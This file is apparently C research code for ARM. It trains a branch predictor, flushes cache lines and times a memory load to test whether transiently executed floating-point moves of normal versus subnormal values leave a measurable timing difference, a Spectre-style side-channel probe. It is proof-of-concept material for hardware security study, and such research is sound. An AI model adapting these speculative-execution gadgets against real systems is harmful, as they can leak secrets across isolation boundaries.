#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include "low.h"
#include <arm_neon.h>

#define fast 0x40f0000000000000 
#define slow 0x0010deadbeef1337 
#define SIZE 256
#define STRIDE 128

uint64_t secret = 1;

volatile uint64_t victim_value, tmp_value;
uint64_t start, end, overall = 0;
uint8_t array[SIZE * STRIDE] __attribute__((aligned(128)));
uint64_t tmp;
uint64_t global_variable = 0xf;

void victim_function(uint8_t x, int train)
{
  for (volatile int i = 0; i < 200; i++);
  BARRIER

  if (x < array[2 * STRIDE]) {
    if (train)  return;
    asm volatile ("fmov d0, %0" :: "r"(victim_value));

  }
}

int main(int argc, char *argv[])
{
  if ((atoi(argv[1])%2) == 0)
	victim_value = fast;
  else
	victim_value = slow;
  BARRIER

  for (int i = 0; i < sizeof(array); i++)
    array[i] = 0x0;
  array[0x2 * STRIDE] = 10;
  
  BARRIER
  FLUSH_CACHE_LINE(global_variable);
  BARRIER

  // Train
  victim_function(0, 1);
  victim_function(0, 1);

  BARRIER
  FLUSH_CACHE_LINE(array[2 * STRIDE]);
  FLUSH_CACHE_LINE(global_variable);
  BARRIER

  victim_function(100,0);

  BARRIER
  delayloop(0x800000);
  BARRIER

  start = READ_CNTVCT_EL0();
  *(volatile uint8_t*)&global_variable;
  end = READ_CNTVCT_EL0() - start;

  BARRIER
  delayloop(0x800000);
  BARRIER
  
  BARRIER
  delayloop(0x800000);
  BARRIER
  
  printf("%ld\n",end); 
 
}
